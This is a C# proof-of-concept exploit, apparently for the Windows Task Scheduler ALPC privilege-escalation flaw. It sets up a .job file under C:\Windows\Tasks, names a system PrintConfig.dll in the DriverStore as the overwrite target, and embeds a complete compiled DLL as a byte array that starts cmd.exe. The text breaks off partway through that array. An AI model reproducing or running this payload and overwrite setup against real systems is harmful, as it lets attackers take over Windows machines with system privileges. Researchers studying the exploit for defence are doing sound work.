﻿using Microsoft.Win32.TaskScheduler;
using System;
using System.IO;
using System.Reflection;

namespace ALPC_Poc
{

    public class Program
    {
        /*
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
        static extern bool CreateHardLink(string lpFileName, string lpExistingFileName,
          IntPtr lpSecurityAttributes);
        */

        static void Main(string[] args)
        {
            string taskFolderJob = Guid.NewGuid().ToString() + ".job";

            string taskFolder = @"C:\Windows\Tasks\" + taskFolderJob ;
            string destfile = @"c:\windows\system32\license.rtf";
            destfile = @"C:\Windows\System32\DriverStore\FileRepository\prnms003.inf_amd64_864418199e8fa69d\Amd64\PrintConfig.dll";

            // Dll byteArray -> it's a simple DLL that contains a method that opens a cmd.exe process
            // see code below
            byte[] ciemmedi = new byte[5120] {
0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x0E, 0x1F, 0xBA, 0x0E, 0x00, 0xB4, 0x09, 0xCD, 0x21, 0xB8, 0x01, 0x4C, 0xCD, 0x21, 0x54, 0x68, 0x69, 0x73, 0x20, 0x70, 0x72, 0x6F, 0x67, 0x72, 0x61, 0x6D, 0x20, 0x63, 0x61, 0x6E, 0x6E, 0x6F, 0x74, 0x20, 0x62, 0x65, 0x20, 0x72, 0x75, 0x6E, 0x20, 0x69, 0x6E, 0x20, 0x44, 0x4F, 0x53, 0x20, 0x6D, 0x6F, 0x64, 0x65, 0x2E, 0x0D, 0x0D, 0x0A, 0x24, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x50, 0x45, 0x00, 0x00, 0x4C, 0x01, 0x03, 0x00, 0xD4, 0x0B, 0xB6, 0x5B, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x00, 0x02, 0x21, 0x0B, 0x01, 0x30, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x32, 0x2A, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x20, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x80, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00, 0x40, 0x85, 0x00, 0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xE0, 0x29, 0x00, 0x00, 0x4F, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x78, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0xA8, 0x28, 0x00, 0x00, 0x1C, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x08, 0x20, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x74, 0x65, 0x78, 0x74, 0x00, 0x00, 0x00, 0x38, 0x0A, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x20, 0x00, 0x00, 0x60, 0x2E, 0x72, 0x73, 0x72, 0x63, 0x00, 0x00, 0x00, 0x78, 0x03, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x40, 0x2E, 0x72, 0x65, 0x6C, 0x6F, 0x63, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x00, 0x60, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x12, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x00, 0x42, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x14, 0x2A, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x00, 0x00, 0x00, 0x02, 0x00, 0x05, 0x00, 0xF8, 0x20, 0x00, 0x00, 0xB0, 0x07, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x13, 0x30, 0x03, 0x00, 0x82, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x11, 0x00, 0x73, 0x0F, 0x00, 0x00, 0x0A, 0x0A, 0x06, 0x6F, 0x10, 0x00, 0x00, 0x0A, 0x72, 0x01, 0x00, 0x00, 0x70, 0x6F, 0x11, 0x00, 0x00, 0x0A, 0x00, 0x06, 0x6F, 0x10, 0x00, 0x00, 0x0A, 0x16, 0x6F, 0x12, 0x00, 0x00, 0x0A, 0x00, 0x06, 0x6F, 0x10, 0x00, 0x00, 0x0A, 0x17, 0x6F, 0x13, 0x00, 0x00, 0x0A, 0x00, 0x06, 0x6F, 0x10, 0x00, 0x00, 0x0A, 0x17, 0x6F, 0x14, 0x00, 0x00, 0x0A, 0x00, 0x06, 0x14, 0xFE, 0x06, 0x02, 0x00, 0x00, 0x06, 0x73, 0x15, 0x00, 0x00, 0x0A, 0x6F, 0x16, 0x00, 0x00, 0x0A, 0x00, 0x06, 0x14, 0xFE, 0x06, 0x02, 0x00, 0x00, 0x06, 0x73, 0x15, 0x00, 0x00, 0x0A, 0x6F, 0x17, 0x00, 0x00, 0x0A, 0x00, 0x06, 0x6F, 0x18, 0x00, 0x00, 0x0A, 0x26, 0x06, 0x6F, 0x19, 0x00, 0x00, 0x0A, 0x00, 0x06, 0x6F, 0x1A, 0x00, 0x00, 0x0A, 0x00, 0x06, 0x6F, 0x1B, 0x00, 0x00, 0x0A, 0x00, 0x2A, 0x3A, 0x00, 0x03, 0x6F, 0x1C, 0x00, 0x00, 0x0A, 0x28, 0x1D, 0x00, 0x00, 0x0A, 0x00, 0x2A, 0x22, 0x02, 0x28, 0x1E, 0x00, 0x00, 0x0A, 0x00, 0x2A, 0x00, 0x00, 0x42, 0x53, 0x4A, 0x42, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0C, 0x00, 0x00, 0x00, 0x76, 0x34, 0x2E, 0x30, 0x2E, 0x33, 0x30, 0x33, 0x31, 0x39, 0x00, 0x00, 0x00, 0x00, 0x05, 0x00, 0x6C, 0x00, 0x00, 0x00, 0x64, 0x02, 0x00, 0x00, 0x23, 0x7E, 0x00, 0x00, 0xD0, 0x02, 0x00, 0x00, 0x8C, 0x03, 0x00, 0x00, 0x23, 0x53, 0x74, 0x72, 0x69, 0x6E, 0x67, 0x73, 0x00, 0x00, 0x00, 0x00, 0x5C, 0x06, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x23, 0x55, 0x53, 0x00, 0x70, 0x06, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x23, 0x47, 0x55, 0x49, 0x44, 0x00, 0x00, 0x00, 0x80, 0x06, 0x00, 0x00, 0x30, 0x01, 0x00, 0x00, 0x23, 0x42, 0x6C, 0x6F, 0x62, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x01, 0x47, 0x15, 0x02, 0x00, 0x09, 0x00, 0x00, 0x00, 0x00, 0xFA, 0x01, 0x33, 0x00, 0x16, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x03, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x1E, 0x00, 0x00, 0x00, 0x0E, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x40, 0x02, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x06, 0x00, 0x75, 0x01, 0x01, 0x03, 0x06, 0x00, 0xE2, 0x01, 0x01, 0x03, 0x06, 0x00, 0xA9, 0x00, 0xCF, 0x02, 0x0F, 0x00, 0x21, 0x03, 0x00, 0x00, 0x06, 0x00, 0xD1, 0x00, 0x54, 0x02, 0x06, 0x00, 0x58, 0x01, 0x54, 0x02, 0x06, 0x00, 0x39, 0x01, 0x54, 0x02, 0x06, 0x00, 0xC9, 0x01, 0x54, 0x02, 0x06, 0x00, 0x95, 0x01, 0x54, 0x02, 0x06, 0x00, 0xAE, 0x01, 0x54, 0x02, 0x06, 0x00, 0xE8, 0x00, 0x54, 0x02, 0x06, 0x00, 0xBD, 0x00, 0xE2, 0x02, 0x06, 0x00, 0x9B, 0x00, 0xE2, 0x02, 0x06, 0x00, 0x1C, 0x01, 0x54, 0x02, 0x06, 0x00, 0x03, 0x01, 0x14, 0x02, 0x06, 0x00, 0x55, 0x03, 0x4D, 0x02, 0x0A, 0x00, 0x4D, 0x03, 0xCF, 0x02, 0x0A, 0x00, 0x30, 0x03, 0xCF, 0x02, 0x0A, 0x00, 0x77, 0x02, 0xCF, 0x02, 0x0A, 0x00, 0x88, 0x02, 0xCF, 0x02, 0x06, 0x00, 0x4D, 0x00, 0x4D, 0x02, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x00, 0x10, 0x00, 0x49, 0x00, 0x2E, 0x02, 0x41, 0x00, 0x01, 0x00, 0x01, 0x00, 0x50, 0x20, 0x00, 0x00, 0x00, 0x00, 0x96, 0x00, 0x66, 0x02, 0x46, 0x00, 0x01, 0x00, 0xDE, 0x20, 0x00, 0x00, 0x00, 0x00, 0x91, 0x00, 0xA1, 0x02, 0x4A, 0x00, 0x01, 0x00, 0xED, 0x20, 0x00, 0x00, 0x00, 0x00, 0x86, 0x18, 0xC9, 0x02, 0x06, 0x00, 0x03, 0x00, 0x00, 0x00, 0x01, 0x00, 0x46, 0x03, 0x00, 0x00, 0x02, 0x00, 0x93, 0x00, 0x09, 0x00, 0xC9, 0x02, 0x01, 0x00, 0x11, 0x00, 0xC9, 0x02, 0x06, 0x00, 0x19, 0x00, 0xC9, 0x02, 0x0A, 0x00, 0x29, 0x00, 0xC9, 0x02, 0x10, 0x00, 0x31, 0x00, 0xC9, 0x02, 0x10, 0x00, 0x39, 0x00, 0xC9, 0x02, 0x10, 0x00, 0x41, 0x00, 0xC9, 0x02, 0x10, 0x00, 0x49, 0x00, 0xC9, 0x02, 0x10, 0x00, 0x51, 0x00, 0xC9, 0x02, 0x10, 0x00, 0x59, 0x00, 0xC9, 0x02, 0x10, 0x00, 0x61, 0x00, 0xC9, 0x02, 0x15, 0x00, 0x69, 0x00, 0xC9, 0x02, 0x10, 0x00, 0x71, 0x00, 0xC9, 0x02, 0x10, 0x00, 0x79, 0x00, 0xC9, 0x02, 0x10, 0x00, 0x89, 0x00, 0xC9, 0x02, 0x06, 0x00, 0x89, 0x00, 0x69, 0x02, 0x1F, 0x00, 0x99, 0x00, 0x55, 0x00, 0x10, 0x00, 0x99, 0x00, 0x00, 0x02, 0x15, 0x00, 0x99, 0x00, 0x6E, 0x03, 0x15, 0x00, 0x99, 0x00, 0xAF, 0x02, 0x15, 0x00, 0xA1, 0x00, 0xC9, 0x02, 0x24, 0x00, 0x89, 0x00, 0x32, 0x00, 0x2A, 0x00, 0x89, 0x00, 0x1C, 0x00, 0x2A, 0x00, 0x89, 0x00, 0x68, 0x03, 0x30, 0x00, 0x89, 0x00, 0x75, 0x00, 0x06, 0x00, 0x89, 0x00, 0x62, 0x00, 0x06, 0x00, 0x89, 0x00, 0x5C, 0x03, 0x06, 0x00, 0x91, 0x00, 0x0A, 0x00, 0x34, 0x00, 0xA9, 0x00, 0x89, 0x00, 0x38, 0x00, 0x81, 0x00, 0xC9, 0x02, 0x06, 0x00, 0x2E, 0x00, 0x0B, 0x00, 0x51, 0x00, 0x2E, 0x00, 0x13, 0x00, 0x5A, 0x00, 0x2E, 0x00, 0x1B, 0x00, 0x79, 0x00, 0x2E, 0x00, 0x23, 0x00, 0x82, 0x00, 0x2E, 0x00, 0x2B, 0x00, 0x90, 0x00, 0x2E, 0x00, 0x33, 0x00, 0x90, 0x00, 0x2E, 0x00, 0x3B, 0x00, 0x90, 0x00, 0x2E, 0x00, 0x43, 0x00, 0x82, 0x00, 0x2E, 0x00, 0x4B, 0x00, 0x96, 0x00, 0x2E, 0x00, 0x53, 0x00, 0x90, 0x00, 0x2E, 0x00, 0x5B, 0x00, 0x90, 0x00, 0x2E, 0x00, 0x63, 0x00, 0xAE, 0x00, 0x2E, 0x00, 0x6B, 0x00, 0xD8, 0x00, 0x2E, 0x00, 0x73, 0x00, 0xE5, 0x00, 0x1A, 0x00, 0x04, 0x80, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x37, 0x02, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3D, 0x00, 0x13, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3D, 0x00, 0x4D, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x3C, 0x4D, 0x6F, 0x64, 0x75, 0x6C, 0x65, 0x3E, 0x00, 0x67, 0x65, 0x74, 0x5F, 0x44, 0x61, 0x74, 0x61, 0x00, 0x6D, 0x73, 0x63, 0x6F, 0x72, 0x6C, 0x69, 0x62, 0x00, 0x61, 0x64, 0x64, 0x5F, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x44, 0x61, 0x74, 0x61, 0x52, 0x65, 0x63, 0x65, 0x69, 0x76, 0x65, 0x64, 0x00, 0x61, 0x64, 0x64, 0x5F, 0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x44, 0x61, 0x74, 0x61, 0x52, 0x65, 0x63, 0x65, 0x69, 0x76, 0x65, 0x64, 0x00, 0x63, 0x6D, 0x64, 0x00, 0x43, 0x6F, 0x6E, 0x73, 0x6F, 0x6C, 0x65, 0x00, 0x73, 0x65, 0x74, 0x5F, 0x46, 0x69, 0x6C, 0x65, 0x4E, 0x61, 0x6D, 0x65, 0x00, 0x42, 0x65, 0x67, 0x69, 0x6E, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x52, 0x65, 0x61, 0x64, 0x4C, 0x69, 0x6E, 0x65, 0x00, 0x42, 0x65, 0x67, 0x69, 0x6E, 0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x52, 0x65, 0x61, 0x64, 0x4C, 0x69, 0x6E, 0x65, 0x00, 0x57, 0x72, 0x69, 0x74, 0x65, 0x4C, 0x69, 0x6E, 0x65, 0x00, 0x6F, 0x75, 0x74, 0x4C, 0x69, 0x6E, 0x65, 0x00, 0x47, 0x75, 0x69, 0x64, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x44, 0x65, 0x62, 0x75, 0x67, 0x67, 0x61, 0x62, 0x6C, 0x65, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x43, 0x6F, 0x6D, 0x56, 0x69, 0x73, 0x69, 0x62, 0x6C, 0x65, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x41, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x54, 0x69, 0x74, 0x6C, 0x65, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x41, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x54, 0x72, 0x61, 0x64, 0x65, 0x6D, 0x61, 0x72, 0x6B, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x54, 0x61, 0x72, 0x67, 0x65, 0x74, 0x46, 0x72, 0x61, 0x6D, 0x65, 0x77, 0x6F, 0x72, 0x6B, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x41, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x46, 0x69, 0x6C, 0x65, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x41, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x43, 0x6F, 0x6E, 0x66, 0x69, 0x67, 0x75, 0x72, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x41, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x44, 0x65, 0x73, 0x63, 0x72, 0x69, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x43, 0x6F, 0x6D, 0x70, 0x69, 0x6C, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x52, 0x65, 0x6C, 0x61, 0x78, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x73, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x41, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x50, 0x72, 0x6F, 0x64, 0x75, 0x63, 0x74, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x41, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x43, 0x6F, 0x70, 0x79, 0x72, 0x69, 0x67, 0x68, 0x74, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x41, 0x73, 0x73, 0x65, 0x6D, 0x62, 0x6C, 0x79, 0x43, 0x6F, 0x6D, 0x70, 0x61, 0x6E, 0x79, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x52, 0x75, 0x6E, 0x74, 0x69, 0x6D, 0x65, 0x43, 0x6F, 0x6D, 0x70, 0x61, 0x74, 0x69, 0x62, 0x69, 0x6C, 0x69, 0x74, 0x79, 0x41, 0x74, 0x74, 0x72, 0x69, 0x62, 0x75, 0x74, 0x65, 0x00, 0x73, 0x65, 0x74, 0x5F, 0x55, 0x73, 0x65, 0x53, 0x68, 0x65, 0x6C, 0x6C, 0x45, 0x78, 0x65, 0x63, 0x75, 0x74, 0x65, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x52, 0x75, 0x6E, 0x74, 0x69, 0x6D, 0x65, 0x2E, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x69, 0x6E, 0x67, 0x00, 0x43, 0x69, 0x65, 0x6D, 0x6D, 0x65, 0x64, 0x69, 0x00, 0x41, 0x4C, 0x50, 0x43, 0x5F, 0x44, 0x6C, 0x6C, 0x00, 0x41, 0x4C, 0x50, 0x43, 0x5F, 0x44, 0x6C, 0x6C, 0x2E, 0x64, 0x6C, 0x6C, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x52, 0x65, 0x66, 0x6C, 0x65, 0x63, 0x74, 0x69, 0x6F, 0x6E, 0x00, 0x47, 0x6F, 0x00, 0x67, 0x65, 0x74, 0x5F, 0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x00, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x53, 0x74, 0x61, 0x72, 0x74, 0x49, 0x6E, 0x66, 0x6F, 0x00, 0x44, 0x61, 0x74, 0x61, 0x52, 0x65, 0x63, 0x65, 0x69, 0x76, 0x65, 0x64, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x00, 0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x48, 0x61, 0x6E, 0x64, 0x6C, 0x65, 0x72, 0x00, 0x73, 0x65, 0x74, 0x5F, 0x52, 0x65, 0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x45, 0x72, 0x72, 0x6F, 0x72, 0x00, 0x2E, 0x63, 0x74, 0x6F, 0x72, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x44, 0x69, 0x61, 0x67, 0x6E, 0x6F, 0x73, 0x74, 0x69, 0x63, 0x73, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x52, 0x75, 0x6E, 0x74, 0x69, 0x6D, 0x65, 0x2E, 0x49, 0x6E, 0x74, 0x65, 0x72, 0x6F, 0x70, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x73, 0x00, 0x53, 0x79, 0x73, 0x74, 0x65, 0x6D, 0x2E, 0x52, 0x75, 0x6E, 0x74, 0x69, 0x6D, 0x65, 0x2E, 0x43, 0x6F, 0x6D, 0x70, 0x69, 0x6C, 0x65, 0x72, 0x53, 0x65, 0x72, 0x76, 0x69, 0x63, 0x65, 0x73, 0x00, 0x44, 0x65, 0x62, 0x75, 0x67, 0x67, 0x69, 0x6E, 0x67, 0x4D, 0x6F, 0x64, 0x65, 0x73, 0x00, 0x44, 0x61, 0x74, 0x61, 0x52, 0x65, 0x63, 0x65, 0x69, 0x76, 0x65, 0x64, 0x45, 0x76, 0x65, 0x6E, 0x74, 0x41, 0x72, 0x67, 0x73, 0x00, 0x73, 0x65, 0x6E, 0x64, 0x69, 0x6E, 0x67, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x00, 0x4F, 0x62, 0x6A, 0x65, 0x63, 0x74, 0x00, 0x57, 0x61, 0x69, 0x74, 0x46, 0x6F, 0x72, 0x45, 0x78, 0x69, 0x74, 0x00, 0x53, 0x74, 0x61, 0x72, 0x74, 0x00, 0x73, 0x65, 0x74, 0x5F, 0x52, 0x65, 0x64, 0x69, 0x72, 0x65, 0x63, 0x74, 0x53, 0x74, 0x61, 0x6E, 0x64, 0x61, 0x72, 0x64, 0x4F, 0x75, 0x74, 0x70, 0x75, 0x74, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x63, 0x00, 0x6D, 0x00, 0x64, 0x00, 0x2E, 0x00, 0x65, 0x00, 0x78, 0x00, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x4D, 0xF6, 0x98, 0x66, 0x59, 0x7E, 0x5A, 0x44, 0x9F, 0x4D, 0x48, 0xDE, 0x8D, 0x01, 0x3C, 0xDE, 0x00, 0x04, 0x20, 0x01, 0x01, 0x08, 0x03, 0x20, 0x00, 0x01, 0x05, 0x20, 0x01, 0x01, 0x11, 0x11, 0x04, 0x20, 0x01, 0x01, 0x0E, 0x04, 0x20, 0x01, 0x01, 0x02, 0x04, 0x07, 0x01, 0x12, 0x45, 0x04, 0x20, 0x00, 0x12, 0x4D, 0x05, 0x20, 0x02, 0x01, 0x1C, 0x18, 0x05, 0x20, 0x01, 0x01, 0x12, 0x51, 0x03, 0x20, 0x00, 0x02, 0x03, 0x20, 0x00, 0x0E, 0x04, 0x00, 0x01, 0x01, 0x0E, 0x08, 0xB7, 0x7A, 0x5C, 0x56, 0x19, 0x34, 0xE0, 0x89, 0x03, 0x00, 0x00, 0x01, 0x06, 0x00, 0x02, 0x01, 0x1C, 0x12, 0x49, 0x08, 0x01, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00, 0x1E, 0x01, 0x00, 0x01, 0x00, 0x54, 0x02, 0x16, 0x57, 0x72, 0x61, 0x70, 0x4E, 0x6F, 0x6E, 0x45, 0x78, 0x63, 0x65, 0x70, 0x74, 0x69, 0x6F, 0x6E, 0x54, 0x68, 0x72, 0x6F, 0x77, 0x73, 0x01, 0x08, 0x01, 0x00, 0x07, 0x01, 0x00, 0x00, 0x00, 0x00, 0x0D, 0x01, 0x00, 0x08, 0x41, 0x4C, 0x50, 0x43, 0x5F, 0x44, 0x6C, 0x6C, 0x00, 0x00, 0x05, 0x01, 0x00, 0x00, 0x00, 0x00, 0x17, 0x01, 0x00, 0x12, 0x43, 0x6F, 0x70, 0x79, 0x72, 0x69, 0x67, 0x68, 0x74, 0x20, 0xC2, 0xA9, 0x20, 0x20, 0x32, 0x30, 0x31, 0x38, 0x00, 0x00, 0x29, 0x01, 0x00, 0x24, 0x34, 0x39, 0x30, 0x32, 0x34, 0x35, 0x36, 0x63, 0x2D, 0x39, 0x33, 0x30, 0x34, 0x2D, 0x34, 0x32, 0x61, 0x33, 0x2D, 0x39, 0x32, 0x65, 0x63, 0x2D, 0x65, 0x30, 0x38, 0x30, 0x33, 0x65, 0x65, 0x61, 0x61, 0x66, 0x62, 0x62, 0x00, 0x00, 0x0C, 0x01, 0x00, 0x07, 0x31, 0x2E, 0x30, 0x2E, 0x30, 0x2E, 0x30, 0x00, 0x00, 0x47, 0x01, 0x00, 0x1A, 0x2E, 0x4E, 0x45, 0x54, 0x46, 0x72, 0x61, 0x6D, 0x65, 0x77, 0x6F, 0x72, 0x6B, 0x2C, 0x56, 0x65, 0x72, 0x73, 0x69, 0x6F, 0x6E, 0x3D, 0x76, 0x34, 0x2E, 0x30, 0x01, 0x00, 0x54, 0x0E, 0x14, 0x46, 0x72, 0x61, 0x6D, 0x65, 0x77, 0x6F, 0x72, 0x6B, 0x44, 0x69, 0x73, 0x70, 0x6C, 0x61, 0x79, 0x4E, 0x61, 0x6D, 0x65, 0x10, 0x2E, 0x4E, 0x45, 0x54, 0x20, 0x46, 0x72, 0x61, 0x6D, 0x65, 0x77, 0x6F, 0x72, 0x6B, 0x20, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xD4, 0x0B, 0xB6, 0x5B, 0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x1C, 0x01, 0x00, 0x00, 0xC4, 0x28, 0x00, 0x00, 0xC4, 0x0A, 0x00, 0x00, 0x52, 0x53, 0x44, 0x53, 0x4F, 0x3D, 0x73, 0x38, 0x50, 0xED, 0xB4, 0x4F, 0x9D, 0xEA, 0x1E, 0x63, 0x63, 0x4A, 0x02, 0x09, 0x01, 0x00, 0x00, 0x00, 0x43, 0x3A, 0x5C, 0x74, 0x65, 0x6D, 0x70, 0x32, 0x5C, 0x74, 0x65, 0x6D, 0x70, 0x5C, 0x50, 0x53, 0x42, 0x79, 0x70, 0x61, 0x73, 0x73, 0x43, 0x4C, 0x4D, 0x5C, 0x41, 0x4C, 0x50, 0x43, 0x5F, 0x44, 0x6C, 0x6C, 0x5C, 0x6F, 0x62, 0x6A, 0x5C, 0x44, 0x65, 0x62, 0x75, 0x67, 0x5C, 0x41, 